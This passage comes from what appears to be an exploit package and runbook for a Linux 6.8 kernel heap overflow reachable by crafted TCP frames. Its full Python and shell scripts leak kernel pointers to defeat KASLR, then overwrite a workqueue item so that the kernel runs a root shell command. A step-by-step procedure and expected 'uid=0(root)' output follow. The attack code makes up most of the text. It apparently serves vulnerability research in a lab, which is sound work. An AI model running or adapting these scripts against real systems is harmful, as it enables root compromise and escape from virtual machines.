    page = (last["dopt"] - 16) & ~0xfff if last else max(pages, key=lambda p: len(pages[p]))
    print("page=%#x objs=%d (last sport=%s)" % (page, len(pages.get(page, [])),
          last["sport"] if last else "?"), flush=True)

    a2s = {a: sp for sp, a in slots.items()}
    triples = []
    for sp, a in pages.get(page, []):
        b = a - 64; v = a; w = a + 64
        if b in a2s and w in a2s:
            triples.append((b, v, w))
    if not triples:
        print("ABORT no [B][V][W] triple on page"); obs.terminate(); return 1
    # prefer the triple whose slots are latest (sports near the end)
    triples.sort(key=lambda t: a2s[t[2]], reverse=True)
    S_b, S_v, S_w = triples[0]
    sp_b, sp_v, sp_w = a2s[S_b], a2s[S_v], a2s[S_w]
    seq_b = (seqbase + (sp_b - base)) & 0xffffffff
    seq_v = (seqbase + (sp_v - base)) & 0xffffffff
    seq_w = (seqbase + (sp_w - base)) & 0xffffffff
    print("TRIPLE B=%#x(sport %d) V=%#x(%d) W=%#x(%d) page=%#x" %
          (S_b, sp_b, S_v, sp_v, S_w, sp_w, page), flush=True)

    # 2) build all frames before the critical section
    fr_rst_w = frame(sp_w, (seq_w + 1) & 0xffffffff, rst=True)
    fr_rst_b = frame(sp_b, (seq_b + 1) & 0xffffffff, rst=True)
    ov_sp = 47000 + (int(time.time()) % 200)
    fr_ov = frame(ov_sp, 0x60000000, wire=0x4000, payload=read_payload())
    fr_dup_v = frame(sp_v, seq_v)      # pure retransmitted SYN, seq == rcv_isn

    # kworkers SCHED_IDLE on CPU7 (residency)
    kws = sh("ps -eLo tid,psr,comm | awk '$2==7 && /kworker/ {print $1}'").stdout.split()
    for t in kws:
        sh("chrt -i -p 0 %s 2>/dev/null" % t)

    old = os.sched_getscheduler(0)
    t0 = time.time()
    try:
        os.sched_setscheduler(0, os.SCHED_FIFO, os.sched_param(50))
        s.send(fr_rst_w)      # free S_w
        probe6(gw, s6)        # work -> S_w (head)
        s.send(fr_rst_b)      # free S_b
        s.send(fr_ov)         # dopt -> S_b; 64B echo -> S_v header, optlen=255
        s.send(fr_dup_v)      # retransmit SYN-ACK from stored S_v opt (255B)
        dt = (time.time() - t0) * 1e6
    finally:
        os.sched_setscheduler(0, old, os.sched_param(0))
    print("CRITICAL dt=%.0fus" % dt, flush=True)

    # 3) capture
    win = None; capinfo = None
    deadline = time.time() + 0.6
    while time.time() < deadline:
        try:
            fr = cap.recv(65535)
        except BlockingIOError:
            time.sleep(0.002); continue
        except Exception:
            continue
        off = 0
        if len(fr) < 34: continue
        et = struct.unpack(">H", fr[12:14])[0]; off = 14
        while et in (0x8100, 0x88a8) and len(fr) >= off + 4:
            et = struct.unpack(">H", fr[off + 2:off + 4])[0]; off += 4
        if et != 0x0800: continue
        ip = fr[off:]
        if len(ip) < 295 or ip[9] != 6: continue
        if bytes(ip[12:16]) != DST4 or bytes(ip[16:20]) != SRC4: continue
        # malformed 255-byte option header: TCP starts at IP+20+255
        t = 20 + 255
        if struct.unpack(">H", ip[t:t+2])[0] != 7778: continue
        dport = struct.unpack(">H", ip[t+2:t+4])[0]
        if dport != sp_v: continue
        w = bytes(ip[20:275])
        win = w; capinfo = (len(ip), struct.unpack(">H", ip[2:4])[0], dport,
                            struct.unpack(">H", ip[t+14:t+16])[0])
        break
    time.sleep(0.4)
    for t in kws:
        sh("chrt -o -p 0 %s 2>/dev/null" % t)

    q, e, x = parse_obs()
    qw = [ev for ev in q if ev["work"] == S_w]
    ov_echo = [ev for ev in e if ev["sport"] == ov_sp]
    print("QUEUE S_w=%s EXEC S_w=%s ov_echo=%s" % (
        qw[-1] if qw else None,
        [ev for ev in x if ev["work"] == S_w][-1:],
        ov_echo[-1:]), flush=True)
    print("CAPTURE %s" % (capinfo,), flush=True)
    if win is None:
        print("LEAK NO_WINDOW", flush=True); obs.terminate(); return 2
    q0_, q1, q2, q3 = struct.unpack("<4Q", win[32:64])
    print("WINDOW32 data=%#x next=%#x prev=%#x func=%#x" % (q0_, q1, q2, q3), flush=True)
    print("WINHEX %s" % win[:96].hex(), flush=True)
    if qw:
        gt = qw[-1]
        mask_ok = (q0_ & ~0xff) == gt["pwq"]
        func_ok = q3 == gt["func"]
        links_ok = (q1 == gt["next"] and q2 == gt["prev"])
        print("MATCH pwq=%s func=%s links=%s (gt data=%#x next=%#x prev=%#x func=%#x)" %
              (mask_ok, func_ok, links_ok, gt["data"], gt["next"], gt["prev"], gt["func"]),
              flush=True)
        print("DERIVED pwq=%#x poolhead=%#x kbase=%#x" %
              (q0_ & ~0xff, q1, q3 - RT6_OFF), flush=True)
    else:
        print("NO_QUEUE_GROUND_TRUTH (work may have been dequeued or missed S_w)", flush=True)
    obs.terminate()
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

### 5.6 `scripts/r6/r6fire.py` — dry/fire workqueue overwrite

```python
#!/usr/bin/env python3
# r6fire.py -- observer-free dry then fire on the current ELIGIBLE r6 boot.
#
# Payload values are the boot-stable values leaked through the guest-visible
# 255-byte window (NOT taken from the CO-RE observer):
#   pwq      = 0xffff8b25801d9e00
#   poolhead = 0xffff8b28efdb43a8
#   kbase    = 0xffffffff8cc00000
#
# The work that leaked W=0xffff8b2583720840 already executed; a fire needs a
# fresh work in a freed successor slot.  The script therefore builds fresh
# [V][W] pairs on the current active slab and writes into W:
#   RST W -> probe (site N) -> work at W
#   RST V -> overflower dopt at V -> echo V+32=W-32
#   dry  0x4000: 64B header overwrite, func=__x86_return_thunk
#   fire 0xE000: 192B header+subprocess_info, func=call_usermodehelper_exec_work
#
# r6obs is used only to verify QUEUE work==W, ECHO dopt==V, EXEC func.
# No 0xFF00.  Abort on any mismatch.  SCHED_IDLE kworkers + FIFO sender.
import os, re, sys, time, struct, socket, subprocess

DEV = "r6a"; PEER = "r6b"
SRC4 = bytes([192, 168, 250, 114])
DST4 = bytes([192, 168, 250, 1])
LOG = "/tmp/r6new/obs-fire.log"

PWQ = 0xffff8b25801d9e00
PH = 0xffff8b28efdb43a8
KBASE = 0xffffffff8cc00000
RET_OFF = 0x126c330
EXEC_OFF = 0x12ec10
RT6_OFF = 0x10cbfd0


def sh(c, to=30):
    return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=to)


def ksym(n):
    out = sh("grep -w %s /proc/kallsyms | head -1" % n).stdout.split()
    return int(out[0], 16) if out else 0


def csum(d):
    if len(d) % 2:
        d += b"\0"
    s = sum(struct.unpack(">%dH" % (len(d) // 2), d))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff


def csum_partial(d):
    s = 0; i = 0
    while i + 1 < len(d):
        s += d[i] | (d[i + 1] << 8); i += 2
    if i < len(d):
        s += d[i]
    return s


def csum_fold(s):
    s = (s & 0xffff) + (s >> 16); s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff


def htons(v):
    return ((v << 8) | (v >> 8)) & 0xffff


def peer_mac():
    try:
        return bytes.fromhex(open("/sys/class/net/%s/address" % PEER).read().strip().replace(":", ""))
    except Exception:
        return b"\xff" * 6


def frame(sport, seq, wire=None, payload=b"\x41" * 64, rst=False):
    hl = 20 if rst else 32
    thlen = 20
    ip = bytearray(hl + thlen + len(payload))
    ip[0] = 0x40 | (hl // 4)
    struct.pack_into(">H", ip, 2, len(ip)); struct.pack_into(">H", ip, 4, 0x4242)
    ip[8] = 64; ip[9] = 6; ip[12:16] = SRC4; ip[16:20] = DST4
    if not rst:
        ip[20] = 7; ip[21] = 11; ip[22] = 12
        for i in range(23, 31):
            ip[i] = 0x40 + i
        ip[31] = 0
    th = memoryview(ip)[hl:]
    struct.pack_into(">HHII", th, 0, sport, 7778, seq & 0xffffffff, 0)
    th[12] = 5 << 4; th[13] = 0x04 if rst else 0x02
    struct.pack_into(">H", th, 14, 0x4000)
    if not rst:
        th[thlen:] = payload
    pseudo = SRC4 + DST4 + b"\0" + bytes([6]) + struct.pack(">H", thlen + len(payload))
    struct.pack_into(">H", th, 16, csum(pseudo + bytes(th[:thlen + len(payload)])))
    vhdr = bytearray(10)
    if wire is not None:
        want = htons(wire)
        for w in range(65536):
            ip[25] = w & 0xff; ip[26] = (w >> 8) & 0xff
            if csum_fold(csum_partial(bytes(ip[21:]))) == want:
                break
        struct.pack_into(">H", ip, 10, 0); struct.pack_into(">H", ip, 10, csum(bytes(ip[:hl])))
        vhdr[0] = 1; struct.pack_into("<H", vhdr, 6, 14 + 21)
    else:
        struct.pack_into(">H", ip, 10, 0); struct.pack_into(">H", ip, 10, csum(bytes(ip[:hl])))
    eth = peer_mac() + bytes.fromhex("020000000002") + struct.pack(">H", 0x0800)
    return bytes(vhdr) + eth + bytes(ip)


def sock():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((DEV, 0))
    s.setsockopt(263, 15, 1)
    return s


def probe6(gw, s6):
    icmp = struct.pack(">BBHHH", 128, 0, 0, 0x1234, 0) + b"R6R6"
    s6.sendto(icmp, ("fd01:0:%x::1" % gw, 0, 0, 0))


def dry_payload():
    p = bytearray(64)
    struct.pack_into("<Q", p, 0, PWQ | 5)
    struct.pack_into("<Q", p, 8, PH)
    struct.pack_into("<Q", p, 16, PH)
    struct.pack_into("<Q", p, 24, KBASE + RET_OFF)
    return bytes(p)


def fire_payload(W):
    p = bytearray(192)
    struct.pack_into("<Q", p, 0, PWQ | 5)
    struct.pack_into("<Q", p, 8, PH)
    struct.pack_into("<Q", p, 16, PH)
    struct.pack_into("<Q", p, 24, KBASE + EXEC_OFF)
    struct.pack_into("<Q", p, 32, 0)
    struct.pack_into("<Q", p, 40, W + 128)
    struct.pack_into("<Q", p, 48, W + 160)
    struct.pack_into("<Q", p, 56, W + 184)
    struct.pack_into("<I", p, 64, 2)
    p[128:136] = b"/bin/sh\0"
    p[136:140] = b"-c\0\0"
    cmd = b"id > /tmp/pwned\0"
    p[140:140 + len(cmd)] = cmd
    struct.pack_into("<4Q", p, 160, W + 128, W + 136, W + 140, 0)
    return bytes(p)


def start_obs(rt6, secs=120):
    os.makedirs("/tmp/r6new", exist_ok=True)
    open(LOG, "w").close()
    obs = subprocess.Popen(["/opt/pwnescape/tools/r6obs", "%x" % rt6, str(secs)],
                           stdout=open(LOG, "w"), stderr=subprocess.STDOUT)
    for _ in range(80):
        if "READY" in open(LOG, errors="ignore").read():
            return obs, True
        time.sleep(0.1)
    return obs, False


def parse_obs():
    q = []; e = []; x = []
    for ln in open(LOG, errors="ignore"):
        p = ln.split()
        if not p:
            continue
        try:
            if p[0] == "QUEUE" and len(p) >= 9:
                q.append(dict(work=int(p[1], 16), pwq=int(p[2], 16), data=int(p[3], 16),
                              next=int(p[4], 16), prev=int(p[5], 16), func=int(p[6], 16),
                              cpu=int(p[7]), ts=int(p[8])))
            elif p[0] == "EXEC" and len(p) >= 5:
                x.append(dict(work=int(p[1], 16), func=int(p[2], 16), cpu=int(p[3]),
                              ts=int(p[4])))
            elif p[0] == "ECHO" and len(p) >= 5:
                e.append(dict(dopt=int(p[1], 16), sport=int(p[2]), cpu=int(p[3]),
                              ts=int(p[4])))
        except Exception:
            pass
    return q, e, x


def setup_gw(gw):
    nhid = 30000 + (gw & 0xffff)
    sh("ip -6 route del fd01:0:%x::/64 2>/dev/null" % gw)
    sh("ip nexthop del id %d 2>/dev/null" % nhid)
    r = sh("ip nexthop add id %d via fe80::%x dev virbr-pwn" % (nhid, gw))
    if r.returncode != 0:
        print("nexthop add failed: %s" % r.stderr.strip(), flush=True)
    sh("ip -6 route replace fd01:0:%x::/64 nhid %d" % (gw, nhid))
    sh("ip -6 neigh replace fe80::%x lladdr 02:00:00:00:00:01 dev virbr-pwn nud failed" % gw)


def set_kworkers_idle():
    kws = sh("ps -eLo tid,psr,comm | awk '$2==7 && /kworker/ {print $1}'").stdout.split()
    for t in kws:
        sh("chrt -i -p 0 %s 2>/dev/null" % t)
    return kws


def restore_kworkers(kws):
    for t in kws:
        sh("chrt -o -p 0 %s 2>/dev/null" % t)


def run_critical(s, s6, actions):
    old = os.sched_getscheduler(0)
    t0 = time.time()
    try:
        os.sched_setscheduler(0, os.SCHED_FIFO, os.sched_param(50))
        for kind, arg in actions:
            if kind == "send":
                s.send(arg)
            else:
                probe6(arg, s6)
        dt = (time.time() - t0) * 1e6
    finally:
        os.sched_setscheduler(0, old, os.sched_param(0))
    return dt


def check(q, e, x, W, V, ov_sp, want_func):
    qw = [ev for ev in q if ev["work"] == W]
    ew = [ev for ev in e if ev["sport"] == ov_sp]
    xw = [ev for ev in x if ev["work"] == W]
    ok_q = bool(qw)
    ok_e = bool(ew) and ew[-1]["dopt"] - 16 == V
    ok_x = bool(xw) and xw[-1]["func"] == want_func
    print("  CHECK QUEUE=%s (%s) ECHO=%s (%s) EXEC=%s (%s)" % (
        ok_q, hex(qw[-1]["data"]) if qw else None,
        ok_e, hex(ew[-1]["dopt"]) if ew else None,
        ok_x, hex(xw[-1]["func"]) if xw else None), flush=True)
    return ok_q and ok_e and ok_x


def wait_queue(W, timeout=0.25):
    t0 = time.time()
    while time.time() - t0 < timeout:
        q, e, x = parse_obs()
        if any(ev["work"] == W for ev in q):
            return True
    return False


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 60
    gw_dry = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0x7d00
    gw_fire = gw_dry + 1
    rt6 = ksym("rt6_probe_deferred")
    try:
        os.sched_setaffinity(0, {7})
    except Exception as e:
        print("affinity err", e, flush=True)
    print("FIRE-RUN n=%d gw_dry=%#x gw_fire=%#x rt6=%#x" %
          (n, gw_dry, gw_fire, rt6), flush=True)
    print("payload pwq=%#x ph=%#x kbase=%#x" % (PWQ, PH, KBASE), flush=True)
    print("funcs dry=%#x fire=%#x" % (KBASE + RET_OFF, KBASE + EXEC_OFF), flush=True)

    for gw in (gw_dry, gw_fire):
        setup_gw(gw)
    sh("ip neigh replace 192.168.250.114 lladdr 52:54:00:b2:39:e6 dev virbr-pwn nud permanent 2>/dev/null")
    print("aging 11.6s", flush=True)
    time.sleep(11.6)

    sh("pkill -x bpftrace 2>/dev/null; pkill -x r6obs 2>/dev/null")
    time.sleep(0.2)
    obs, ready = start_obs(rt6, 120)
    print("obs_ready=%s" % ready, flush=True)
    if not ready:
        obs.terminate(); return 1

    s6 = socket.socket(socket.AF_INET6, socket.SOCK_RAW, 58)
    s6.bind(("fd00:1::1", 0))
    s = sock()

    base = 55000 + (int(time.time()) % 300)
    seqbase = 0x55000000 + (int(time.time()) & 0xfff) * 256
    sports = set(range(base, base + n))
    for i in range(n):
        s.send(frame(base + i, (seqbase + i) & 0xffffffff))
    time.sleep(0.15)

    q, e, x = parse_obs()
    slots = {ev["sport"]: ev["dopt"] - 16 for ev in e if ev["sport"] in sports}
    if len(slots) < 10:
        print("ABORT too few victims (%d)" % len(slots)); obs.terminate(); return 1
    pages = {}
    for sp, a in slots.items():
        pages.setdefault(a & ~0xfff, []).append((sp, a))
    last = max((ev for ev in e if ev["sport"] in sports), key=lambda ev: ev["ts"])
    page = (last["dopt"] - 16) & ~0xfff
    a2s = {a: sp for sp, a in slots.items()}
    pairs = []
    for sp, a in pages.get(page, []):
        if a + 64 in a2s:
            pairs.append((a, a + 64, sp, a2s[a + 64]))
    pairs.sort(key=lambda p: p[3], reverse=True)
    chosen = []; used = set()
    for p in pairs:
        if p[0] in used or p[1] in used:
            continue
        chosen.append(p); used.add(p[0]); used.add(p[1])
        if len(chosen) >= 2:
            break
    pairs = chosen
    print("victims=%d page=%#x objs=%d pairs=%d" %
          (len(slots), page, len(pages.get(page, [])), len(pairs)), flush=True)
    if len(pairs) < 2:
        print("ABORT need >=2 disjoint adjacent pairs"); obs.terminate(); return 1

    kws = set_kworkers_idle()

    # ---------- DRY ----------
    V, W, sv, sw = pairs[0]
    seqv = (seqbase + (sv - base)) & 0xffffffff
    seqw = (seqbase + (sw - base)) & 0xffffffff
    ov_sp = 48100 + (int(time.time()) % 100)
    fr_w = frame(sw, (seqw + 1) & 0xffffffff, rst=True)
    fr_v = frame(sv, (seqv + 1) & 0xffffffff, rst=True)
    fr_ov = frame(ov_sp, 0x61000000, wire=0x4000, payload=dry_payload())
    print("DRY V=%#x(%d) W=%#x(%d) ovs=%d" % (V, sv, W, sw, ov_sp), flush=True)
    # one FIFO section: the work cannot be dequeued between probe and copy
    dt = run_critical(s, s6, [("send", fr_w), ("probe", gw_dry),
                              ("send", fr_v), ("send", fr_ov)])
    print("  dt=%.0fus" % dt, flush=True)
    time.sleep(0.8)
    q, e, x = parse_obs()
    if not check(q, e, x, W, V, ov_sp, KBASE + RET_OFF):
        print("DRY FAIL -- abort, no fire", flush=True)
        restore_kworkers(kws); obs.terminate(); return 2
    if os.path.exists("/tmp/pwned"):
        print("UNEXPECTED /tmp/pwned after dry", flush=True)
        restore_kworkers(kws); obs.terminate(); return 3
    print("DRY PASS", flush=True)
    dry_ok = True

    # ---------- FIRE ----------
    V2, W2, sv2, sw2 = pairs[1]
    seqv2 = (seqbase + (sv2 - base)) & 0xffffffff
    seqw2 = (seqbase + (sw2 - base)) & 0xffffffff
    ov_sp2 = ov_sp + 1
    fr_w2 = frame(sw2, (seqw2 + 1) & 0xffffffff, rst=True)
    fr_v2 = frame(sv2, (seqv2 + 1) & 0xffffffff, rst=True)
    fr_ov2 = frame(ov_sp2, 0x62000000, wire=0xE000, payload=fire_payload(W2))
    print("FIRE V=%#x(%d) W=%#x(%d) ovs=%d func=%#x" %
          (V2, sv2, W2, sw2, ov_sp2, KBASE + EXEC_OFF), flush=True)
    dt = run_critical(s, s6, [("send", fr_w2), ("probe", gw_fire),
                              ("send", fr_v2), ("send", fr_ov2)])
    print("  dt=%.0fus" % dt, flush=True)
    time.sleep(1.2)
    q, e, x = parse_obs()
    ok = check(q, e, x, W2, V2, ov_sp2, KBASE + EXEC_OFF)
    pwn = os.path.exists("/tmp/pwned")
    print("FIRE check=%s pwned=%s" % (ok, pwn), flush=True)
    if pwn:
        print("== PWND ==", flush=True)
        print(sh("cat /tmp/pwned; id; hostname").stdout, flush=True)
    else:
        print("NO /tmp/pwned", flush=True)
    restore_kworkers(kws)
    obs.terminate()
    return 0 if pwn else 4


if __name__ == "__main__":
    sys.exit(main())
```

### 5.7 `scripts/r6/r6guestsniff.py` — guest-side window capture

```python
#!/usr/bin/env python3
# guest window sniffer: capture the malformed 255-byte-option SYN-ACK.
import socket, struct, time, sys

IFACE = "enp1s0"
SRC = bytes([192, 168, 250, 1])
DST = bytes([192, 168, 250, 114])
out = sys.argv[1] if len(sys.argv) > 1 else "/tmp/guestwin.txt"
secs = int(sys.argv[2]) if len(sys.argv) > 2 else 25

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.bind((IFACE, 0))
s.settimeout(0.5)
deadline = time.time() + secs
with open(out, "w") as f:
    f.write("sniffer up\n"); f.flush()
    while time.time() < deadline:
        try:
            fr = s.recv(65535)
        except socket.timeout:
            continue
        except Exception as e:
            f.write("err %s\n" % e); f.flush(); continue
        if len(fr) < 14 + 295:
            continue
        off = 14
        et = struct.unpack(">H", fr[12:14])[0]
        while et in (0x8100, 0x88a8) and len(fr) >= off + 4:
            et = struct.unpack(">H", fr[off + 2:off + 4])[0]; off += 4
        if et != 0x0800:
            continue
        ip = fr[off:]
        if len(ip) < 295 or ip[9] != 6:
            continue
        if bytes(ip[12:16]) != SRC or bytes(ip[16:20]) != DST:
            continue
        t = 20 + 255
        if struct.unpack(">H", ip[t:t + 2])[0] != 7778:
            continue
        dport = struct.unpack(">H", ip[t + 2:t + 4])[0]
        win = bytes(ip[20:275])
        q0, q1, q2, q3 = struct.unpack("<4Q", win[32:64])
        f.write("GUESTWIN tot=%d dport=%d data=%#x next=%#x prev=%#x func=%#x\n" %
                (struct.unpack(">H", ip[2:4])[0], dport, q0, q1, q2, q3))
        f.write("WINHEX %s\n" % win.hex())
        f.flush()
print("done")
```

### 5.8 Self-check helper

`scripts/r6/r6selfcheck.py` and `scripts/r6/r6selfcheck_guest.py` implement the
guest-visible `queued/dequeued` checks:

- `(data & 0x5) == 0x5`;
- `pwq` 256-byte aligned and canonical;
- `entry.next == entry.prev` and `(next & 0x3f) != 0x08` (self-link after
  `list_del_init` is `W+8`);
- `func` is canonical text and `func - 0x10cbfd0` is 2 MiB aligned;
- `window[64:80] == fe80::<gw>`.

These checks can replace the `QUEUE`/`ECHO` abort gates, but **not** the
absolute `V/W` addresses. `EXEC` is not guest-visible for
`__x86_return_thunk`; the fire's `/tmp/pwned` is the execution proof.

### 5.9 `scripts/r6/run_r6.sh` — leak, patch, dry/fire wrapper

```bash
#!/bin/bash
# run_r6.sh -- run the r6 leak, patch the payload constants, then dry/fire.
#
# Usage:
#   sudo bash scripts/r6/run_r6.sh [victims] [read_gw] [fire_gw]
# Defaults: 40 0x7c30 0x7e00
#
# The script assumes the host fixture in LAB-ENV.md is already up:
#   r6veth_up.sh, listen_on.py, mangle/INPUT CHECKSUM, fd00:1::1/64.
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
T="${PWNESCAPE_TOOLS:-/opt/pwnescape/tools}"
N="${1:-40}"
GW_R="${2:-0x7c30}"
GW_F="${3:-0x7e00}"

if [ "$(id -u)" -ne 0 ]; then
  echo "run as root" >&2
  exit 1
fi

if [ ! -x "$T/r6obs" ]; then
  echo "missing $T/r6obs; run scripts/common/install.sh first" >&2
  exit 1
fi

echo "=== 1. leak (read-only) ==="
OUT="$(mktemp /tmp/r6read.XXXXXX.log)"
python3 "$T/r6read.py" "$N" "$GW_R" | tee "$OUT"

DERIVED="$(grep '^DERIVED ' "$OUT" | tail -1 || true)"
if [ -z "$DERIVED" ]; then
  echo "no DERIVED line; leak failed; aborting" >&2
  exit 2
fi

PWQ=$(echo "$DERIVED" | sed -n 's/.*pwq=\(0x[0-9a-fA-F]*\).*/\1/p')
PH=$(echo "$DERIVED" | sed -n 's/.*poolhead=\(0x[0-9a-fA-F]*\).*/\1/p')
KBASE=$(echo "$DERIVED" | sed -n 's/.*kbase=\(0x[0-9a-fA-F]*\).*/\1/p')
if [ -z "$PWQ" ] || [ -z "$PH" ] || [ -z "$KBASE" ]; then
  echo "failed to parse DERIVED: $DERIVED" >&2
  exit 3
fi
echo "derived: pwq=$PWQ poolhead=$PH kbase=$KBASE"

echo "=== 2. patch a run copy of r6fire.py ==="
RUN="/tmp/r6fire_run.py"
cp "$T/r6fire.py" "$RUN"
python3 - "$RUN" "$PWQ" "$PH" "$KBASE" <<'PY'
import re, sys
path, pwq, ph, kbase = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
s = open(path).read()
s = re.sub(r'(?m)^PWQ\s*=\s*.*$', 'PWQ   = ' + pwq, s, count=1)
s = re.sub(r'(?m)^PH\s*=\s*.*$', 'PH    = ' + ph, s, count=1)
s = re.sub(r'(?m)^KBASE\s*=\s*.*$', 'KBASE = ' + kbase, s, count=1)
open(path, 'w').write(s)
PY
chmod +x "$RUN"
grep -E '^(PWQ|PH|KBASE) ' "$RUN" | head -3

echo "=== 3. dry/fire ==="
python3 "$RUN" 60 "$GW_F"
```

---

## 6. Runbook

### 6.1 Prepare

```bash
# L1
sudo bash scripts/common/install.sh
sudo bash /opt/pwnescape/tools/r6veth_up.sh
sudo python3 /opt/pwnescape/tools/listen_on.py 7778 &
sudo iptables -t mangle -A INPUT -p tcp --dport 7778 \
  -j CHECKSUM --checksum-fill
sudo ip -6 addr add fd00:1::1/64 dev virbr-pwn nodad
sudo sysctl -qw net.ipv6.conf.virbr-pwn.router_probe_interval=10
sudo sysctl -qw net.ipv4.tcp_synack_retries=12
```

### 6.2 Gate

```bash
sudo python3 /opt/pwnescape/tools/r6_host_gate2.py 10 0x7b00
```

Accept only:

```
HOSTGATE2 dopt=... siteE=... siteN=... hit=N verdict=ELIGIBLE
```

If `INELIGIBLE`, cold-boot and retry. The gate is read-only.

### 6.3 Leak

```bash
sudo python3 /opt/pwnescape/tools/r6read.py 40 0x7c30
```

Expected:

```
TRIPLE B=... V=... W=... page=...
WINDOW32 data=0xffff8b25801d9e05 next=0xffff8b28efdb43a8
         prev=0xffff8b28efdb43a8 func=0xffffffff8dccbfd0
MATCH pwq=True func=True links=True
DERIVED pwq=0xffff8b25801d9e00 poolhead=0xffff8b28efdb43a8 kbase=0xffffffff8cc00000
```

Optional guest capture, before the leak:

```bash
# L2
sudo python3 /tmp/r6guestsniff.py /tmp/guestwin.txt 30
```

### 6.4 Set the payload constants

`r6fire.py` has three literals at the top:

```python
PWQ   = 0xffff8b25801d9e00
PH    = 0xffff8b28efdb43a8
KBASE = 0xffffffff8cc00000
```

Replace them with the `DERIVED` values from the current boot. Do **not** reuse
values across boots.

### 6.5 Dry and fire

```bash
sudo python3 /opt/pwnescape/tools/r6fire.py 60 0x7e00
```

The script performs:

1. a dry run with `wire=0x4000`, `func = __x86_return_thunk`;
2. a fire run with `wire=0xE000`, `func = call_usermodehelper_exec_work`.

Expected dry:

```
DRY V=... W=...
  CHECK QUEUE=True ... ECHO=True ... EXEC=True ...
DRY PASS
```

Expected fire:

```
FIRE V=... W=... func=0xffffffff8cd2ec10
  CHECK QUEUE=True ... ECHO=True ... EXEC=True ...
FIRE check=True pwned=True
== PWND ==
uid=0(root) gid=0(root) groups=0(root)
```

### 6.6 Automated variant

`scripts/r6/run_r6.sh` performs the leak, parses the `DERIVED` line, patches a
temporary copy of `r6fire.py`, and runs the dry/fire pair:

```bash
sudo bash scripts/r6/run_r6.sh 40 0x7c30 0x7e00
```

It does not install the host fixture; run the steps in §6.1 first.

### 6.7 Verify

```bash
sudo cat /tmp/pwned
sudo sha256sum /tmp/pwned
```

---

## 7. Gates and abort criteria

Abort and do not fire on any of:

- `QUEUE work != W`;
- overflower `ECHO dopt != V` (the copy hit another slot);
- `EXEC func` is not the expected function;
- no 255-byte window, or the window does not match the live work;
- `DRY` produced `/tmp/pwned` (unexpected);
- any SSH/ping loss or host instability.

Never send `0xFF00`. Never send `0xE000` before the dry PASS. If the fire
overflower misses `S_v`, the 224-byte copy hits an unrelated `kmalloc-64`
object; this is the historical wedge mode.

---

## 8. Evidence

Evidence is **not bundled** in this package (removed by request). The result,
gate, and limitation summaries above are retained. The original `/tmp/pwned`
SHA-256 was:

```
5ef391d886d04116cf84b584ae37ef136f83950ab69b7bfb2a6da7506f7b3a57
```

The same command was used for the r1 run, so the hash is a useful
cross-check that the callback executed the expected payload.

---

## 9. Limitations

1. **Host-fixture.** The writer, listener, IPv6 probe, and CPU7 pinning are
   host-side. This is not a zero-configuration escape.
2. **Absolute `V/W` observer.** `pwq`, `poolhead`, and KASLR are guest-visible,
   but the payload's self-pointers need `W`. The 255-byte window does not
   contain `W`; `r6obs` (or an equivalent geometry oracle) supplies it.
3. **Per-boot cache lottery.** `dopt` and `rt6_probe_work` must share the same
   `kmalloc-rnd-XX-64` cache. The gate must report `ELIGIBLE`.
4. **Per-boot values.** `PWQ`, `PH`, `KBASE`, `V`, `W`, and the cache index
   change on every boot. Re-derive.
5. **Timing.** One FIFO section is mandatory. The kworker runs in ~40 us if
   the section is split.
6. **`r6read.py` is a development driver.** It uses `r6obs` for the ECHO map
   and ground truth. The payload values are guest-visible, but the full run is
   not observer-free.
7. **`r6fire.py` literals.** The as-run script hard-codes the successful
   boot's values. A fresh boot requires editing the three constants.
8. **Host-side injection.** `r6read.py` and `r6fire.py` run on L1 and inject
   frames with the guest source address. This is a determinism choice; the same
   frames are guest-issuable via `AF_PACKET` + `PACKET_VNET_HDR`.
9. **Lab-specific literals.** The r6 drivers use `SRC4=192.168.250.114`,
   `DST4=192.168.250.1`, `DEV=r6a`, `PEER=r6b`, and the guest MAC
   `52:54:00:b2:39:e6`. Update them if the rebuilt L2 has a different address
   or MAC.
10. **Build-specific offsets.** `0x10cbfd0` (`rt6_probe_deferred`),
    `0x126c330` (`__x86_return_thunk`), and `0x12ec10`
    (`call_usermodehelper_exec_work`) are for the audited `6.8.0-139` build.
    Re-resolve them from `/proc/kallsyms` or BTF on a different build.

---

## 10. Reproduction checklist

- [ ] L1 kernel is `6.8.0-139-generic`, pre-fix.
- [ ] `CONFIG_RANDSTRUCT_NONE=y`, no `CONFIG_DEBUG_OBJECTS`.
- [ ] `xt_CHECKSUM` module loaded, `mangle/INPUT` rule installed.
- [ ] `r6a`/`r6b` veth up, `dum0` route present.
- [ ] listener on `0.0.0.0:7778`.
- [ ] `fd00:1::1/64` on `virbr-pwn`, `router_probe_interval=10`.
- [ ] vhost/sshd/listener on CPU7; CPU7 kworkers `SCHED_IDLE`.
- [ ] `r6obs` built and working.
- [ ] gate reports `ELIGIBLE`.
- [ ] leak reports `MATCH ... True` and `DERIVED`.
- [ ] constants updated in `r6fire.py`.
- [ ] dry PASS, then fire.
- [ ] `/tmp/pwned` is `uid=0(root)`.
